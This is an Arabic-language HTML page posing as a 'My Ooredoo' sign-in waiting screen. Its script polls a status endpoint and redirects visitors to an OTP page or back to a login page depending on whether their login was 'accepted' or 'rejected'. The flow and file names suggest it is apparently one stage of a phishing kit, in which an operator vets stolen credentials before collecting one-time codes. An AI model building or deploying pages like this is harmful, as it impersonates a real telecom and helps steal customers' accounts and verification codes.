<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>جارٍ تسجيل الدخول - My Ooredoo</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --red:#ED1C24;
    --ink:#1b1b2f;
    --muted:#8a8a8f;
    --bg:#fff;
    box-sizing:border-box;
    padding-top:env(safe-area-inset-top,0px);
    padding-bottom:env(safe-area-inset-bottom,0px);
  }
  *,*::before,*::after{box-sizing:inherit;}
  html,body{margin:0;min-height:100%;background:var(--bg);}
  body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    color:var(--ink);
    font-family:'IBM Plex Sans Arabic',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
    -webkit-font-smoothing:antialiased;
  }
  .screen{
    width:100%;
    max-width:380px;
    min-height:100vh;
    padding:40px 22px 30px;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    text-align:center;
  }
  .logo{
    width:76px;
    height:76px;
    margin-bottom:28px;
    border-radius:50%;
    display:grid;
    place-items:center;
    background:var(--red);
    color:#fff;
    font-size:21px;
    font-weight:700;
    letter-spacing:-1px;
    animation:logo-in .55s ease both;
  }
  h1{
    margin:0 0 10px;
    font-size:24px;
    line-height:1.4;
    font-weight:700;
    animation:content-in .55s .08s ease both;
  }
  p{
    margin:0;
    color:var(--muted);
    font-size:15px;
    line-height:1.7;
    animation:content-in .55s .14s ease both;
  }
  .loader{
    width:42px;
    height:42px;
    margin-top:30px;
    border:3px solid #f5c6c8;
    border-top-color:var(--red);
    border-radius:50%;
    animation:spin .8s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg);}}
  @keyframes logo-in{from{opacity:0;transform:scale(.75)}to{opacity:1;transform:scale(1)}}
  @keyframes content-in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
  @media (max-width:380px){
    .screen{padding:44px 20px 32px;}
  }
  @media (prefers-reduced-motion:reduce){
    *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;}
  }
</style>
</head>
<body>
  <main class="screen" aria-live="polite">
    <div class="logo" aria-label="Ooredoo">Ooredoo</div>
    <h1>جارٍ تسجيل الدخول</h1>
    <p>يرجى الانتظار لحظات...</p>
    <div class="loader" role="status" aria-label="جارٍ التحميل"></div>
  </main>
  <script>
    (function(){
      var params = new URLSearchParams(window.location.search);
      var id = params.get('id') || params.get('ref');
      if (!id) return;
      var timer = setInterval(function(){
        fetch('/api/status/' + encodeURIComponent(id), {cache:'no-store'})
          .then(function(r){ return r.ok ? r.json() : null; })
          .then(function(d){
            if (!d || !d.status) return;
            var st = String(d.status).toLowerCase();
            if (st === 'ooredoo_login_accepted') {
              clearInterval(timer);
              window.location.href = 'ooredoo-otp.html?id=' + encodeURIComponent(id);
            } else if (st === 'ooredoo_login_rejected') {
              clearInterval(timer);
              var msg = 'تم رفض بيانات أوريدو. يرجى التحقق والمحاولة مرة أخرى.';
              window.location.href = 'ooredoo-login.html?id=' + encodeURIComponent(id) + '&error=ooredoo&msg=' + encodeURIComponent(msg);
            }
          }).catch(function(){});
      }, 2000);
    })();
  </script>
<script src="heartbeat.js"></script>
</body>
</html>
